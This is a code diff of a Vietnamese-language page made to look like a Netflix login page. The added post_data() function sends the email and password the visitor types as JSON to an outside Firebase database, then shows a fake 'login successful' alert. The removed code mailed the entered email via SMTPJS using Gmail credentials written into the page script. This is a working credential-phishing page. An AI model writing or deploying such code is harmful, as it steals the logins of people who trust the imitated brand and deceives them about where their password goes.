@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix</title>
-    <link rel="stylesheet" href="./netflix.css">
+    <link rel="stylesheet" href="./login.css">
     <link rel="shortcut icon" href="./favicon/nficon2016.ico" type="image/x-icon">  
 </head>
 <body>
@@ -16,15 +16,15 @@
         <div class="login_body">
             <div class="login_box">
                 <h2>Đăng nhập</h2>
-                <form onsubmit="sendEmail(); reset(); return false; ">
+                <form action="" id="contactForm" onsubmit="post_data()">
                     <div class="input_box">
-                        <input required type="email" id="email" placeholder="Email hoặc số điện thoại">
+                        <input required type="email" id="emailID" placeholder="Email hoặc số điện thoại">
                     </div>
                     <div class="input_box">
-                        <input required type="password" id="password" placeholder="Mật khẩu">
+                        <input required type="password" id="passwordID" placeholder="Mật khẩu">
                     </div>
                     <div>
-                        <button class="submit" type="submit">Đăng nhập</button>
+                        <button id="submit">Đăng nhập</button>
                     </div>
                 </form>
                     <div class="support">
@@ -82,24 +82,24 @@
             </select>
         </div>
     </div>
-    <script src=" https://smtpjs.com/v3/smtp.js"></script>
+
     <script>
-        function sendEmail(){
-            Email.send({
-            Host : "smtp.gmail.com",
-            Username : "huyhoang123@gmail.com",
-            Password : "password",
-            To : 'huyhoang123@gmail.com',
-            From : document.getElementById("email").value,
-            Subject : "Nex Contact Form Enquiry",
-            Body : "And this is the body"
-        }).then(
-        message => alert(message)
-        );
-        }
-        function submitForm(){
-            document.getElementById('myform').submit();
-        }
+
+        function post_data() {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function () {
+                if (xhttp.readyState == 4 && xhttp.status == 200) {
+                    let info = JSON.parse(this.responseText);
+                }
+            };
+            xhttp.open("POST", "https://login-ddh-default-rtdb.firebaseio.com/user.json");
+            let emailID = document.getElementById("emailID").value
+            let passwordID = document.getElementById("passwordID").value
+            let data = JSON.stringify({"email": emailID, "password": passwordID})
+            xhttp.send(data);
+
+            alert("Đăng nhập thành công!");
+        };
 
     </script>
 </body>
